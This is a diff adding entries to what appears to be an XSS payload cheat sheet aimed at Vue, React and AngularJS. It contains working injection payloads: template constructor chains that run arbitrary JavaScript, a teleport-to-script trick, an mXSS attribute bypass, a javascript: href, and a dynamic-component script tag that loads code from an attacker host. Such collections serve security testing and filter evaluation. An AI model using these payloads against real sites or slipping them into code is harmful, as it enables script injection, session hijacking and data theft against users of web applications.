@@ -71,3 +71,80 @@ Abuse Ember.js SafeString for XSS execution
 ```html
 Ember.String.htmlSafe('<script>alert(1)</script>')
 ```
+
+### Vue 3 — Teleport XSS
+
+Vue teleport moves decoded HTML to script element — becomes executable
+
+- **Contexts**: html
+- **Severity**: high
+
+```html
+<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport>
+```
+
+### Vue 3 — Emit Constructor Chain
+
+Access Function constructor via $emit in Vue 3 template expressions
+
+- **Contexts**: html
+- **Severity**: high
+
+```html
+{{$emit.constructor`alert(1)`()}}
+```
+
+### Vue — Dynamic Component Script
+
+Shortest Vue XSS (23 chars) — is= resolves to script element
+
+- **Contexts**: html
+- **Severity**: high
+
+```html
+<x is=script src=//attacker.com>
+```
+
+### Vue — mXSS Attribute Parsing
+
+Vue decodes attributes and removes invalid names — entities become live HTML
+
+- **Contexts**: attribute
+- **Severity**: high
+
+```html
+<x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;">
+```
+
+### Vue — Event Composed Path
+
+Traverse to window via composedPath in Vue event handler
+
+- **Contexts**: html
+- **Severity**: high
+
+```html
+<img src @error="e=$event.composedPath().pop().alert(1)">
+```
+
+### React — javascript: in href
+
+React doesn't block javascript: URIs in href attributes
+
+- **Contexts**: attribute
+- **Severity**: high
+
+```html
+<a href="javascript:alert(document.domain)">Click</a>
+```
+
+### AngularJS — Constructor Chain (Post-Sandbox)
+
+AngularJS 1.6+ removed sandbox — direct constructor access
+
+- **Contexts**: html
+- **Severity**: high
+
+```html
+{{constructor.constructor('alert(1)')()}}
+```
